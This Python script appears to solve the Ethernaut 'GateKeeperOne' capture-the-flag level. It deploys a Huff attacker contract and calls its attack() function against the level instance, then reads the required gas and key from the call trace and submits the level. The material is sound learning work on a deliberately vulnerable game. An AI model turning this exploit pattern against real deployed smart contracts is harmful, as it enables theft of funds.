from ape import accounts
from ..utils.helper import (
    get_level_instance,
    level_completed,
    deploy_huff_contract,
    get_sig,
    send_tx,
)

ETHERNAUT = "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd"
LEVEL = "0x2a2497aE349bCA901Fea458370Bd7dDa594D1D69"


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deploy hacker contract
    print("\n--- Huff Huff... Deploying hacker contract ---\n")
    hacker = deploy_huff_contract("GateKeeperOne.huff", instance, user)

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")
    receipt = send_tx(user, hacker, get_sig("attack()"), gas=9_000_000)

    outputs = receipt.call_tree.outputs

    gas = "0x" + outputs[62:66]

    key = "0x" + outputs[66:82]

    print(f"\n--- The gas required to pass this level: {gas} ---\n")

    print(f"\n--- The key for this level: {key} ---\n")

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
